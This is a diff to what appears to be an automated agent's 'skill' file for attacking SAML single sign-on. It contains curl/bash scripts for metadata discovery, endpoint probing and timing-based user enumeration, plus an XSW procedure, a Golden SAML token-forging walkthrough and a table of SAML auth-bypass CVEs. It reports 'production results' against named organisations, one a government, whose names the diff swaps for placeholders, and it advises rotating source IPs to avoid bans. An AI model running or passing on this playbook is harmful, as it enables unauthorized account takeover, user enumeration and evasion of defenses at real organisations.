@@ -1,24 +1,22 @@
 ---
 name: saml-sso-attack
 description: Attack SAML SSO via XSW, signature strip, metadata extract.
-version: 1.0.0
-author: agentiko
+version: 1.1.0
+revision_date: 2026-07-25
 license: MIT
 platforms: [linux]
-compatibility: Requires agentiko worker (curl, nmap, python3, masscan, subfinder, httpx, nuclei)
-metadata:
-  hermes:
-    tags: [auth, SAML, SSO, XML-signature, identity]
-    category: auth
-    related_skills:
-      - jwt-attack
-      - exchange-owa-attack
-      - api-noauth-hunt
+compatibility: Requires curl, python3, bash
+tags: [auth, SAML, SSO, XML-signature, identity]
+category: auth
+related_skills:
+  - jwt-attack
+  - exchange-owa-attack
+  - api-noauth-hunt
 ---
 
 # SAML SSO Attack Skill
 
-SAML Single Sign-On attack methodology — IdP metadata analysis, XML Signature Wrapping (XSW), signature stripping, comment injection in NameID, and SSO timing-based user enumeration. Confirmed on MPF Argentina (SimpleSAMLphp IdP, 79 XMLRPC methods on WordPress SP), Missao.org.br (Ory Kratos + OIDC), and Panco (ADFS WS-Trust exposed).
+SAML Single Sign-On attack methodology — IdP metadata analysis, XML Signature Wrapping (XSW), signature stripping, comment injection in NameID, and SSO timing-based user enumeration. Confirmed on TARGET_ORG_A (SimpleSAMLphp IdP, 79 XMLRPC methods on WordPress SP), TARGET_ORG_B (Ory Kratos + OIDC), and TARGET_ORG_C (ADFS WS-Trust exposed).
 
 ## When to Use
 
@@ -29,7 +27,7 @@ SAML Single Sign-On attack methodology — IdP metadata analysis, XML Signature 
 
 ## Prerequisites
 
-- `terminal` tool with curl, python3.
+- curl, python3.
 - Target SAML endpoint URLs (from recon or metadata).
 - SAML Raider Burp extension for interactive testing (optional).
 
@@ -37,7 +35,7 @@ SAML Single Sign-On attack methodology — IdP metadata analysis, XML Signature 
 
 ```bash
 # Discover SAML IdP metadata
-curl -sk "https://TARGET/saml2/idp/metadata.php" | python3 -c "
+curl --max-time 30 --connect-timeout 10 -sk "https://TARGET/saml2/idp/metadata.php" | python3 -c "
 import sys, base64, zlib
 from xml.etree import ElementTree as ET
 content = sys.stdin.read()
@@ -68,6 +66,7 @@ print(decompressed.decode())
 | Key confusion | Multiple signing certs in metadata | Sign assertions with different key |
 | Audience restriction bypass | No `Audience` validation | Cross-SP token reuse |
 | Metadata extraction | Public IdP metadata | Discover certs, endpoints, bindings |
+| Golden SAML (post-exploit) | Stolen ADFS token-signing cert | Forge tokens, impersonate any user |
 
 ## Procedure
 
@@ -92,8 +91,9 @@ SAML_PATHS["/idp/shibboleth"]="Shibboleth"
 SAML_PATHS["/simplesamlphp"]="SimpleSAMLphp root"
 
 for path in "${!SAML_PATHS[@]}"; do
-  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "https://$TARGET$path")
+  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 --connect-timeout 5 "https://$TARGET$path")
   [[ "$code" == "200" || "$code" == "302" ]] && echo "  [FOUND] $path — ${SAML_PATHS[$path]} (HTTP $code)"
+  sleep 1
 done
 ```
 
@@ -104,7 +104,7 @@ METADATA_URL="$1"  # e.g., https://idp.target.com/saml2/idp/metadata.php
 
 echo "[*] Extracting SAML metadata from $METADATA_URL"
 
-METADATA=$(curl -sk --max-time 10 "$METADATA_URL" 2>/dev/null)
+METADATA=$(curl -sk --max-time 10 --connect-timeout 10 "$METADATA_URL" 2>/dev/null)
 
 if [[ -z "$METADATA" ]]; then
   echo "[-] No metadata accessible"
@@ -206,12 +206,13 @@ echo "[*] SSO timing-based user enumeration"
 
 while read -r user; do
   START=$(date +%s%N)
-  curl -sk -o /dev/null --max-time 15 \
+  curl -sk -o /dev/null --max-time 15 --connect-timeout 10 \
     "https://$TARGET/sso/login?username=$user&password=WRONG_PASS" 2>/dev/null
   END=$(date +%s%N)
   ELAPSED=$(( (END - START) / 1000000 ))
 
   echo "  $user: ${ELAPSED}ms"
+  sleep 1
 done < "$USERS_FILE" | sort -t: -k2 -rn | head -20
 
 echo "[*] Users with significantly higher response times likely exist"
@@ -241,13 +242,13 @@ echo "  6. If SP accepts → XSW confirmed"
 
 ## Real Production Results
 
-### MPF Argentina (SimpleSAMLphp IdP)
+### TARGET_ORG_A (SimpleSAMLphp IdP)
 - SAML metadata exposed at `/saml2/idp/metadata.php`
 - WordPress SP with 79 XMLRPC methods active behind SSO
 - SSO blocks direct WP access but XMLRPC bypasses SSO entirely
 - User enumeration possible via timing differential
 
-### ADFS (Panco / Brazilian government / Monaco)
+### ADFS (TARGET_ORG_C / GOVERNMENT_TARGET / TARGET_ORG_D)
 - ADFS WS-Trust endpoint at `/adfs/services/trust` exposed
 - `UsernameMixed` endpoint allows credential testing
 - Combined with Office 365 tenant ID extraction
@@ -263,6 +264,7 @@ echo "  6. If SP accepts → XSW confirmed"
 - **SAML message is large.** SAMLResponse in URL can be 4000+ characters. POST binding is more common for responses.
 - **SP may validate InResponseTo.** If it does, replay attacks fail. Check by sending the same SAMLResponse twice.
 - **Signature stripping only works on broken SPs.** Most modern SPs reject unsigned assertions.
+- **Rate limiting.** SSO timing enumeration and endpoint discovery can trigger account lockouts or IP bans. Always add `sleep` between requests (≥1s) and use a pool of source IPs for production engagements.
 
 ## Verification
 
@@ -271,3 +273,30 @@ echo "  6. If SP accepts → XSW confirmed"
 - SSO timing enum MUST show a statistically significant difference (>200ms) between valid and invalid users.
 - XSW: Forged SAMLResponse MUST be accepted by the SP and create a valid session.
 - All SAML endpoints must be documented: IdP metadata URL, SP ACS URL, binding types, certificate details.
+
+
+## Modern SAML CVEs & Techniques
+
+| CVE | Affected | Impact | Year |
+|-----|----------|--------|------|
+| CVE-2025-25291 | ruby-saml ≤ 1.17.0 | Auth bypass via XSW / signature confusion | 2025 |
+| CVE-2025-25292 | ruby-saml ≤ 1.17.0 | Auth bypass via parser differential | 2025 |
+| CVE-2024-45428 | GitLab (ruby-saml) | SAML auth bypass — full account takeover | 2024 |
+| CVE-2024-45409 | ruby-saml ≤ 1.16.0 | Signature wrapping (XSW) auth bypass | 2024 |
+| CVE-2023-2813 | GitLab CE/EE | SAML group claim misvalidation | 2023 |
+
+### Golden SAML Attack (Post-Exploitation)
+
+After gaining access to an ADFS server or extracting the token-signing certificate:
+1. Extract the ADFS token-signing certificate (.pfx or private key).
+2. Use tools like **AADInternals** or a custom Python script to forge SAML tokens.
+3. Impersonate any user (including cloud-only identities) without requiring password or MFA.
+4. Relevant for Azure AD / Entra ID federated domains — forged tokens are trusted indefinitely.
+
+### SAML Tools
+
+- **SAML Raider** (Burp extension) — encode/decode, XSW, certificate manipulation
+- **SAMLReQuest** (Burp extension) — lightweight SAML request editor
+- **saml2aws** — CLI for AWS SSO via SAML
+- **AADInternals** — PowerShell toolkit for Azure AD / Entra ID (Golden SAML)
+- **ESPOOR** — SAML message manipulation tool
